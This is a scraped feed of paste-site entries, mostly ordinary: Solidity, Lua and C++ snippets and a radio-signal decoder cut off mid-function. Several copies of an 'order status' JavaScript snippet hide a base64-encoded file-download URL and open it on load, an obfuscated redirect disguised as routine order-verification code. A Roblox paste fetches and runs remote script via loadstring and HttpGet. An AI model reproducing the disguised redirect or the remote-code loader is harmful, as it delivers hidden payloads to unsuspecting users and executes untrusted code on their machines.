          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bAREWZfe,Untitled,M0MI4,JSON,Saturday 19th of April 2025 06:05:38 PM CDT,"{
  ""enabled"": true,
  ""title"": "" "",
  ""message"": ""aaa"",
  ""style"": ""inbox"",
""lines"": ["" "", "" "", "" ""],
  ""sound"": true,
  ""vibrate"": true,
  ""expires"": ""2025-05-01T12:00:00"",
  ""image"": ""http://alo0osh-sy.yn.lt/images/-.jpg"",
  ""actions"": [
    {
      ""title"": """",
      ""url"": ""https://example.com""
    },
    {
      ""title"": """"
    }
  ]
}

// StyleType: bigtext|bigpicture|inbox"
YGwLPbBU,Order.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:02:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23751/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iZH61ZAA,Redz Hub Premium,DatReaperCat,Lua,Saturday 19th of April 2025 05:55:48 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/CodeCrackerXGaming/NoxScripts/refs/heads/main/Redz%20Hub""))()"
tXYW7NsP,Broken createPosition implementation for uniswapv4,Nuclear_Man_D,JavaScript,Saturday 19th of April 2025 05:48:59 PM CDT,"
	function _createPosition2(PoolKey calldata key, uint160 sqrtRatioX96, uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity) internal {

		// Calculate amounts of each token
        // I can't use LiquidityAmounts.getAmountsForLiquidity because the function does not exist in the v4
        // library.  See below links, there is a discrepency between the source and the documentation:
        //  https://docs.uniswap.org/contracts/v4/reference/core/libraries/liquidity-amounts
        //  https://github.com/Uniswap/v4-periphery/blob/main/src/libraries/LiquidityAmounts.sol
        // In any case, I included my own implementation in my utils contract:
        //  http://etherscan.io/address/0xC97B6F6DC641C0f59c724657B91569aF00C28B7D
        // It's based on the UniswapV3 code so I'm pretty sure it works fine.
		(uint256 amount0, uint256 amount1) = utils.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, liquidity);

		// This function reverts if the amounts of the tokens are less than amount0 and amount1 by the end of the call
        // From this, we can be sure that we have enough of the tokens, assuming that amount0 and amount1 are correct
		obtainTokens(Currency.unwrap(key.currency0), Currency.unwrap(key.currency1), amount0, amount1);

		// Grant allowance to the position manager
		if (Currency.unwrap(key.currency0) != address(0)) permit2.approve(Currency.unwrap(key.currency0), address(v4PositionManager), uint160(amount0), 0);
		permit2.approve(Currency.unwrap(key.currency1), address(v4PositionManager), uint160(amount1), 0);

		// Based on code from:
        // https://docs.uniswap.org/contracts/v4/quickstart/manage-liquidity/mint-position
        // https://docs.uniswap.org/contracts/v4/guides/position-manager
		bytes memory actions = abi.encodePacked(
			uint8(Actions.MINT_POSITION),
			uint8(Actions.SETTLE_PAIR)
		);
		bytes[] memory params = new bytes[](2);
		unchecked {
			params[0] = abi.encode(
				key,
				(TickMath.getTickAtSqrtPrice(sqrtRatioAX96) / key.tickSpacing) * key.tickSpacing,
				(TickMath.getTickAtSqrtPrice(sqrtRatioBX96) / key.tickSpacing) * key.tickSpacing,
				(liquidity * 1015) >> 10,  // reduces the inserted liquidity a bit, just in case we barely don't have enough 
				amount0,
				amount1,
				address(this),
				abi.encode(address(this))
			);
		}
		params[1] = abi.encode(key.currency0, key.currency1);

		unchecked {
			uint256 deadline = block.timestamp + 60;
			uint256 valueToPass = key.currency0.isAddressZero() ? amount0 : 0;

            // Our revert happens inside this call, apparently before SETTLE_PAIR is ever reached:
			v4PositionManager.modifyLiquidities{value: valueToPass}(abi.encode(actions, params), deadline);
		}
	}
"
aTbictcs,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:47:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17533/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
waPtJ8T1,Untitled,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:32:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63858/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WyYiP9wC,mecontrol.lua,Saladd,Lua,Saturday 19th of April 2025 05:23:17 PM CDT,"-- Script to interact with ME Bridge via Chat Box commands
-- Version: 1.14 (Startup msg change, Purple brackets, + Prev Features)

-- ================== Configuration ==================
local allowedPrefixes = {
    ""!"",
    ""hey ada "" -- Lowercase for case-insensitive check
}
local initialAdminUser = ""YourMinecraftUsername"" -- !! SET THIS TO YOUR USERNAME !!
local userDbFilename = ""user_db.txt""
local listallFilename = ""item_list.txt""
local wisdomFilename = ""wisdoms.txt""
local wisdomPastebinId = ""wPKJMFkN""
local maxAmbiguityOptions = 3

-- Permission Levels
local LEVEL_ADMIN = ""admin""
local LEVEL_USER = ""user""

-- ================== Global Variables ==================
local users = {}
local itemNameLookup = nil
local displayNameLookup = nil
local wisdomList = {}
local buildError = nil
local chatBox = nil
local bridge = nil

-- ================== Helper Functions ==================

-- Updated reply function: Uses purple ""&5Ada&r"" prefix and purple brackets
local function reply(message)
  if chatBox then
    os.sleep(0.5)
    -- Use &5 for purple prefix name, &r to reset color after name.
    -- Add ""[]"" as brackets argument, and ""&5"" as bracketColor argument.
    chatBox.sendMessage(message, ""&5Ada&r"", ""[]"", ""&5"")
  else
    print(""Error: Chat Box not available."")
  end
end

-- (loadUsers, saveUsers, addToLookup, buildItemDatabase, resolveItemName, updateWisdomsFromPastebin, loadWisdoms functions remain the same as v1.11/v1.13 - condensed)
local function saveUsers() local sU,err=textutils.serialize(users);if not sU then print(""Serialize Err:""..(err or""?""));reply(""CRIT ERR:Save User Prep Fail."");return false end;local f,fE=fs.open(userDbFilename,""w"");if not f then print(""File Open Err:""..(fE or""?""));reply(""CRIT ERR:Save User DB Open Fail."");return false end;f.write(sU);f.close();print(""User DB saved."");return true end
local function loadUsers() if not fs.exists(userDbFilename)then print(""User DB ('""..userDbFilename..""') missing. Creating..."");users={};if initialAdminUser and initialAdminUser~=""""then print(""Adding admin:""..initialAdminUser);users[initialAdminUser]=LEVEL_ADMIN;if not saveUsers()then print(""CRIT:Fail initial save!"")end else print(""Warn:No initial admin."");reply(""Warn:User DB empty."")end;return end;local f,fE=fs.open(userDbFilename,""r"");if not f then print(""File Open Err:""..(fE or""?""));reply(""ERR:Load User DB Fail."");users={};return end;local sU=f.readAll();f.close();if sU==""""then print(""User DB empty."");users={};if initialAdminUser and initialAdminUser~=""""then users[initialAdminUser]=LEVEL_ADMIN;if not saveUsers()then print(""CRIT:Fail initial save!"")end end;return end;local ok,lD=pcall(textutils.unserialize,sU);if not ok or type(lD)~=""table""then print(""Unserialize Err:""..(lD or""?""));reply(""ERR:Load User Data Fail."");users={};else users=lD;print(""User DB loaded(""..table.maxn(users).."" users)."")end end
local function addToLookup(lS,lD,d) if d and d.name then local fN=d.name;local sN=fN:match("".*:(.+)""); local dN=d.displayName; if sN then sN=sN:lower();if not lS[sN]then lS[sN]={}end;local fS=false;for _,eN in ipairs(lS[sN])do if eN==fN then fS=true;break end end;if not fS then table.insert(lS[sN],fN)end end; if dN then dN=dN:lower():gsub(""^%s*%["",""""):gsub(""%]%s*$"",""""):gsub(""^%s*(.-)%s*$"",""%1"");if dN~=""""then if not lD[dN]then lD[dN]={}end;local fD=false;for _,eN in ipairs(lD[dN])do if eN==fN then fD=true;break end end;if not fD then table.insert(lD[dN],fN)end end end end end
local function buildItemDatabase(b) print(""Building DB..."");buildError=nil;local lS,lD,sC={},{},0; local sI,sE=b.listItems();if sI then print(""Proc stored..."");for _,d in ipairs(sI)do addToLookup(lS,lD,d)end;sC=sC+1 else print(""Warn:Stored fail:""..(sE or ""?""));buildError=(buildError and buildError..""; ""or"""")..""Fail stored"" end; local cI,cE=b.listCraftableItems();if cI then print(""Proc craftable..."");for _,d in ipairs(cI)do addToLookup(lS,lD,d)end;sC=sC+1 else print(""Warn:Craftable fail:""..(cE or ""?""));buildError=(buildError and buildError..""; ""or"""")..""Fail craftable"" end; if sC>0 then print(""DB built."");if sC==1 then print(""Warn:DB incomplete."")end else print(""Error:Failed DB build."")end;return lS,lD end
local function resolveItemName(uIn) if buildError and not itemNameLookup and not displayNameLookup then return nil,""DB build fail:""..buildError end;if not itemNameLookup or not displayNameLookup then return nil,""Item DB not built/empty.""end;if uIn:find("":"")then return uIn,nil end;local iL=uIn:lower();local sM=itemNameLookup[iL];if sM and #sM==1 then return sM[1],nil end;local dM=displayNameLookup[iL];if dM and #dM==1 then return dM[1],nil end;local cmb,add={}, {};if sM then for _,n in ipairs(sM)do if not add[n]then table.insert(cmb,n);add[n]=true end end end;if dM then for _,n in ipairs(dM)do if not add[n]then table.insert(cmb,n);add[n]=true end end end;if #cmb==0 then return nil,""Item '""..uIn..""' not found.""elseif #cmb==1 then return cmb[1],nil else local p={};for i=1,math.min(#cmb,maxAmbiguityOptions)do table.insert(p,cmb[i])end;local msg=""Ambiguous:'""..uIn..""'. Try:""..table.concat(p,"", "").."". Be specific."";return nil,msg end end
local function updateWisdomsFromPastebin() if not wisdomPastebinId or wisdomPastebinId==""""or wisdomPastebinId==""YOUR_ID_HERE""then print(""Pastebin ID skip."");return false,""Pastebin ID not set.""end; local tmp=""wisdom_temp.txt"";print(""Downloading wisdom ""..wisdomPastebinId..""...""); if not http then print(""ERR:HTTP disabled."");return false,""HTTP disabled.""end; local ok=shell.run(""pastebin"",""get"",wisdomPastebinId,tmp); if not ok then print(""ERR:Pastebin DL fail."");fs.delete(tmp);return false,""Pastebin DL fail.""end; print(""DL OK. Appending...""); local tmpF,tmpE=fs.open(tmp,""r""); if not tmpF then print(""ERR open tmp:""..(tmpE or""?""));fs.delete(tmp);return false,""Open DL fail.""end; local mainF,mainE=fs.open(wisdomFilename,""a""); if not mainF then print(""ERR open main:""..(mainE or""?""));tmpF.close();fs.delete(tmp);return false,""Open wisdom fail.""end; local lines=0; while true do local l=tmpF.readLine();if l==nil then break end;l=l:match(""^%s*(.-)%s*$"");if l~=""""then mainF.writeLine(l);lines=lines+1 end end; mainF.close();tmpF.close();fs.delete(tmp);print(""Appended ""..lines.."" wisdoms.""); return true,""Appended ""..lines.."" wisdoms."" end
local function loadWisdoms() print(""Loading wisdoms from ""..wisdomFilename..""..."");wisdomList={}; if not fs.exists(wisdomFilename)then print(""Warn:Wisdom file missing."");reply(""Warn:wisdoms.txt missing."");return end; local f,err=fs.open(wisdomFilename,""r"");if not f then print(""Err open wisdom:""..(err or""?""));reply(""Err:Open wisdom fail."");return end; local lN=0;while true do local l=f.readLine();if l==nil then break end;l=l:match(""^%s*(.-)%s*$"");if l~=""""then table.insert(wisdomList,l);lN=lN+1 end end;f.close();print(""Loaded ""..lN.."" wisdoms."");if lN==0 then reply(""Warn:wisdoms.txt empty."")end end

-- ================== Main Script Execution ==================

print(""Ada Script Initializing..."") -- Changed name here too
print(""Attempting to find peripherals..."")
chatBox = peripheral.find(""chatBox"")
bridge = peripheral.find(""meBridge"")
if not chatBox then print(""CRIT ERR: Chat Box not found!""); return end
if not bridge then print(""CRIT ERR: ME Bridge not found!""); reply(""CRIT ERR: ME Bridge not found.""); return end
print(""Peripherals found successfully."")
loadUsers()
local updated, updateMsg = updateWisdomsFromPastebin(); if not updated then reply(""Warn: Wisdom update fail: "" .. updateMsg) end
itemNameLookup, displayNameLookup = buildItemDatabase(bridge)
loadWisdoms()
if buildError then reply(""Warning: "" .. buildError .. "". Name resolution may fail."") end

print(""Initialization complete. Listening..."")
-- *** CHANGED Startup Message ***
reply(""All Systems running."" .. (buildError and "" (Warning: Item DB incomplete)"" or """")) -- Public reply

-- ================== Main Event Loop ==================
while true do
  local eventData = {os.pullEvent()}
  local eventType = eventData[1]

  if eventType == ""chat"" then
    local username=eventData[2]; local message=eventData[3]; local isHidden=eventData[5]

    if not isHidden then
      local matchedPrefix = nil; local originalMatchedPrefix = nil
      local messageLower = message:lower()
      for _, prefix in ipairs(allowedPrefixes) do
          if messageLower:sub(1, #prefix) == prefix:lower() then
              matchedPrefix = prefix:lower(); originalMatchedPrefix = prefix; break
          end
      end

      if matchedPrefix then
          if not users[username] then print(""Denied unregistered: ""..username); reply(""Access Denied.""); goto continue end
          local userLevel = users[username]; print(""Cmd '"" .. message .. ""' from "" .. username .. "" ("" .. userLevel .. "")"")
          local commandPart = message:sub(#originalMatchedPrefix + 1)
          local cmdName = commandPart:match(""^%s*([^%s]+)"") or """"; cmdName = cmdName:lower()
          local remainingArgs = commandPart:match(""^%s*[^%s]+%s+(.*)"") or """"

          -- === Command Handling ===
          if cmdName == ""help"" then local hM=""Cmds: help, status, list <item>, listall, craft <#><item>, iscraftable <item>, rebuilddb, wisdom""; if userLevel==LEVEL_ADMIN then hM=hM.."", user <add|rm|list>, updatewisdoms"" end; reply(hM)
          -- Admin commands
          elseif cmdName == ""user"" then if userLevel~=LEVEL_ADMIN then reply(""Perm Denied: Admin."") else local sC=remainingArgs:match(""^%s*([^%s]+)"")or""""; local sA=remainingArgs:match(""^%s*[^%s]+%s+(.*)"")or""""; sC=sC:lower(); if sC==""add"" then local n,l=sA:match(""^%s*([^%s]+)""),sA:match(""^%s*[^%s]+%s+([^%s]+)"")or LEVEL_USER; l=l:lower(); if not n then reply(""Use: user add <n> [admin|user]"")elseif l~=LEVEL_ADMIN and l~=LEVEL_USER then reply(""Bad lvl."")elseif users[n] then reply(""User exists."")else users[n]=l;if saveUsers()then reply(""User ""..n.."" added(""..l.."")."")else reply(""ERR: Save fail."");users[n]=nil end end elseif sC==""remove"" then local n=sA:match(""^%s*([^%s]+)""); if not n then reply(""Use: user rm <n>"")elseif not users[n] then reply(""User not found."")else local aC=0;for _,l in pairs(users)do if l==LEVEL_ADMIN then aC=aC+1 end end;if users[n]==LEVEL_ADMIN and aC<=1 then reply(""Cannot remove last admin."")else users[n]=nil;if saveUsers()then reply(""User ""..n.."" removed."")else reply(""ERR: Save fail."");users[n]=""error""end end end elseif sC==""list"" then local uL=""Users:\n"";local c=0;for n,l in pairs(users)do uL=uL..""- ""..n..""(""..l.."")\n"";c=c+1 end;if c==0 then reply(""No users."")else reply(uL)end else reply(""Use: user <add|rm|list>"") end end
          elseif cmdName == ""updatewisdoms"" then if userLevel~=LEVEL_ADMIN then reply(""Perm Denied: Admin."") else reply(""Attempting manual wisdom update...""); local ok, msg = updateWisdomsFromPastebin(); if ok then loadWisdoms(); reply(""Wisdom update finished: "" .. msg) else reply(""Wisdom update failed: "" .. msg) end end
          -- User commands
          elseif cmdName == ""wisdom"" then if #wisdomList>0 then local rI=math.random(1,#wisdomList); reply(wisdomList[rI]) else reply(""No wisdom found."") end -- Removed ""Ada says: ""
          elseif cmdName == ""listall"" then print(""Getting items...""); reply(""Saving list to "" .. listallFilename); local allItems,err=bridge.listItems(); if allItems then local file,fE=fs.open(listallFilename,""w""); if not file then print(""Err open: ""..(fE or ""?"")); reply(""Err saving."") else print(""Saving...""); file.writeLine(""--- Item List ---""); for _,d in ipairs(allItems) do file.writeLine(string.format(""N:%s|DN:%s|A:%d"",d.name or ""?"",d.displayName or ""?"",d.amount or 0)) end; file.writeLine(""--- End List ---""); file.close(); print(""Saved.""); reply(""Saved list."") end else print(""Err list: ""..(err or ""?"")); reply(""Err listing."") end
          elseif cmdName == ""rebuilddb"" then reply(""Rebuilding DB...""); itemNameLookup, displayNameLookup = buildItemDatabase(bridge); if buildError then reply(""Warn: ""..buildError) else reply(""DB rebuilt."") end
          elseif cmdName == ""status"" then local e,mE,u,iS,iT=bridge.getEnergyStorage(),bridge.getMaxEnergyStorage(),bridge.getEnergyUsage(),bridge.getUsedItemStorage(),bridge.getTotalItemStorage(); reply(string.format(""AE2 Status|E:%s/%s|Use:%s|Items:%s/%s bytes"",tostring(e or ""?""),tostring(mE or ""?""),tostring(u or ""?""),tostring(iS or ""?""),tostring(iT or ""?"")))
          elseif (cmdName==""list"" or cmdName==""iscraftable"") and remainingArgs~="""" then local uIn=remainingArgs; local rN,rE=resolveItemName(uIn); if not rN then reply(rE or ""Resolve failed."") else if cmdName==""list"" then local iD,err=bridge.getItem({name=rN}); if iD then reply(string.format(""Item:%s(C:%s)Amt:%d(WARN!)"",iD.displayName or rN,tostring(iD.isCraftable),(iD.amount or 0))) else local cr,cErr=bridge.isItemCraftable({name=rN}); if cr then reply(string.format(""Item:%s(C:true)Amt:0(WARN!)"",rN)) else reply(""Item '""..rN..""' not found/err: ""..(err or cErr or ""?"")) end end elseif cmdName==""iscraftable"" then local cr,err=bridge.isItemCraftable({name=rN}); if err then reply(""Err check ""..rN.."": ""..err) else reply(rN.."" is ""..(cr and ""craftable"" or ""not craftable"")) end end end
          elseif cmdName == ""craft"" then local count=tonumber(remainingArgs:match(""^%s*(%d+)%s+"")); local uIn=remainingArgs:match(""^%s*%d+%s+(.*)""); if not count or not uIn or uIn=="""" then reply(""Use: !craft <#> <item>"") else local rN,rE=resolveItemName(uIn); if not rN then reply(rE or ""Resolve failed."") elseif count<=0 then reply(""Bad count."") else reply(""Crafting ""..count.."" ""..rN..""...""); os.sleep(0.1); local s,m=bridge.craftItem({name=rN,count=count}); if s then reply(""Job started."") else reply(""Job failed: ""..(m or ""?"")) end end end
          else reply(""Unknown cmd/args. Use '"" .. (allowedPrefixes[1]:lower() or ""?"") .. ""help'."") end
      end -- end if matchedPrefix
    end -- end if not isHidden
  end -- end if eventType == ""chat""
  ::continue::
end"
iCgdJfDL,Products.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:16:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17865/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NVB6jWUU,Goldilocks (coordinate compression),Vince14,C++,Saturday 19th of April 2025 05:08:29 PM CDT,"#include <iostream>
#include <string>
#include <cstring>
#include <algorithm>
#include <cmath>
#include <regex>
#include <vector>
#include <set>
#include <map>
#include <stack>
#include <queue>
#include <deque>
#include <unordered_map>
#include <numeric>
#include <iomanip>
using namespace std;
#define pii pair<int, int>
#define ll long long
#define FAST ios_base::sync_with_stdio(false); cin.tie(NULL)
#define mp(x1, x2) ( make_pair(x1, x2) )
const int dx[4] = {1, 0, 0, -1}, dy[4] = {0, 1, -1, 0};
const int dl[2] = {1, -1};
const int MOD = 100000007;
const int MAXN = 202020;

int n, x, y, z;
pii arr[MAXN];
vector<int> v;
int changes[MAXN * 3];
int milk[MAXN * 3];

int main(){
    FAST;
    //freopen(""milktemp.in"", ""r"", stdin);
    //freopen(""milktemp.out"", ""w"", stdout);
    cin >> n >> x >> y >> z;
    for (int i = 0; i < n; i++) {
        cin >> arr[i].first >> arr[i].second;
        arr[i].second++;
        v.push_back(arr[i].first);
        v.push_back(arr[i].second);
    }
    sort(v.begin(), v.end());
    v.erase(unique(v.begin(), v.end()), v.end());
    for (int i = 0; i < n; i++) {
        arr[i].first = lower_bound(v.begin(), v.end(), arr[i].first) - v.begin();
        arr[i].second = lower_bound(v.begin(), v.end(), arr[i].second) - v.begin();
        changes[arr[i].first] += y - x;
        changes[arr[i].second] += z - y;
    }
    milk[0] = x * n + changes[0];
    //cout << milk[0] << endl;
    int ans = milk[0];
    for (int i = 1; i < 3 * n; i++) {
        milk[i] = milk[i - 1] + changes[i];
        ans = max(ans, milk[i]);
        //cout << i << "" "" << milk[i] << endl;
    }
    cout << ans << endl;
}
"
QaxWXSx9,Combination Lock,Vince14,C++,Saturday 19th of April 2025 05:06:59 PM CDT,"#include <iostream>
#include <cstdio>
#include <string>
#include <cstring>
#include <algorithm>
#include <cmath>
#include <regex>
#include <vector>
#include <set>
#include <map>
#include <stack>
#include <queue>
#include <deque>
#include <unordered_map>
#include <numeric>
#include <iomanip>
using namespace std;
#define pii pair<int, int>
#define ll long long
#define FAST ios_base::sync_with_stdio(false); cin.tie(NULL)
#define mp(x1, x2) ( make_pair(x1, x2) )
const int dx[4] = {1, 0, 0, -1}, dy[4] = {0, 1, -1, 0};
const int dl[2] = {1, -1};
const int MOD = 100000007;
const int MAXN = 100;

int n;
int x, y, z;
int a, b, c;
int ans = 0;

bool check(int xx, int yy) {
    if (abs(xx - yy) <= 2) return true;
    if (abs(xx - yy) == n - 1 or abs(xx -yy) == n - 2) return true;
    return false;
}
int main(){
    FAST;
    //freopen(""combo.in"", ""r"", stdin);
    //freopen(""combo.out"", ""w"", stdout);
    cin >> n;
    cin >> x >> y >> z;
    cin >> a >> b >> c;
    for (int i = 1; i <= n; i++) {
        for (int j = 1; j <= n; j++) {
            for (int k = 1; k <= n; k++) {
                if ((check(x, i) and check(y, j) and check(z, k)) or
                    (check(a, i) and check(b, j) and check(c, k))) {
                    // cout << i << "" "" << j << "" "" << k << ""\n"";
                    ans++;
                }
            }
        }
    }
    cout << ans << ""\n"";
}
"
etj7t5YM,Order.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:01:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43297/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mCxpnsdm,CodinIDE Update Api,Lizalovv,JSON,Saturday 19th of April 2025 04:58:26 PM CDT,"{
  ""version"": ""1.0.2"",
  ""download_url"": ""https://github.com/mrcutex/CodinIDE/releases/download/CodinIDE/CodinIDE_1.0.apk"",
  ""force_update"": true
}"
9nefzJcU,433mhz,orborbson,Python,Saturday 19th of April 2025 04:53:36 PM CDT,"import esp32, machine, math, time, gc, sys
import ssd1306

@micropython.native
class signals:
    def __init__(self, nums, min_signals = 20, threshold = 1.5, tolerance_in_percent = 50):
        self._nums = nums[0]
        self._initial_state = nums[1]
        self._nums_size = len(nums[0])
        self._min_signals = min_signals
        self._threshold = threshold
        self._tolerance_in_percent = tolerance_in_percent / 100
        self._split_sig = []
        self._dict_sig = {}
        
    def _average(self):
        return sum(self._nums) / self._nums_size

    def _standard_deviation(self):
        avg = self._average()
        variance = sum((x - avg) ** 2 for x in self._nums) / self._nums_size
        return math.sqrt(variance)
    
    def _detect_outliers(self):
        avg = self._average()
        sd = self._standard_deviation()
        return [idx for idx, var in enumerate(self._nums) if abs(var - avg) > self._threshold * sd]
    
    def _split_signals(self):
        spikes = self._detect_outliers()
        big = {}
        start_idx = 0
        #print(self._nums)
        #print(""spikes: "", spikes)
        for idx in spikes:
            signal_length = idx - start_idx
            if signal_length >= self._min_signals:
                if signal_length in big:
                    big[signal_length] += 1
                else:
                    big[signal_length] = 1
            start_idx = idx
        
        start_idx = 0
        if len(big):
            freq = max(big, key = big.get)
            for idx in spikes:
                signal_length = idx - start_idx
                if signal_length == freq:
                    self._split_sig.append(self._nums[start_idx: idx])
                start_idx = idx
   
    def _compare_lists(self, list1, list2):
        if len(list1) != len(list2):
            return False
        for a, b in zip(list1, list2):
            if abs(a - b) > a * self._tolerance_in_percent:
                return False
        return True
        
    def _group_and_average(self):
        groups = {}
        group_id = 0
        for i, list1 in enumerate(self._split_sig):
            found_group = False
            for group_key, group_indices in groups.items():
                if self._compare_lists(list1, self._split_sig[group_indices[0]]):
                    groups[group_key].append(i)
                    found_group = True
                    break
            if not found_group:
                groups[group_id] = [i]
                group_id += 1
        #print(groups)
        result = {}
        for group_key, group_indices in groups.items():
            group_lists = [self._split_sig[i] for i in group_indices]
            #print(""group lists:"", group_lists)
            averages = [sum(values) // len(values) for values in zip(*group_lists)]
            self._dict_sig[group_key] = averages
            
    def return_unique_signals(self):
        self._split_signals()
        self._group_and_average()
        return self._dict_sig
    
def bity_na_int(lista_bitow):
    x = 0
    for bit in lista_bitow:
        x = x * 2 + bit
    return x
    
def sygnaly_na_hex(x):
    sygnaly = x[:]
    prog = sum(sygnaly)/len(sygnaly) # rednia dla sygnaw
    bity = [1 if s > prog else 0 for s in sygnaly] # zamieniam sygnay na bity bazujc na progu
    hex_lista = [(""%.2X"" % bity_na_int(bity[i : i + 8])) for i in range(0, len(bity), 8)] # tworz liste hex-w
    return """".join(hex_lista) # lista -> str

# ==============================================================

# sprawd czy warto mieci siw tolerancji procentowej +/-
@micropython.native
def tolerancja(poprz, akt, ile_procent):
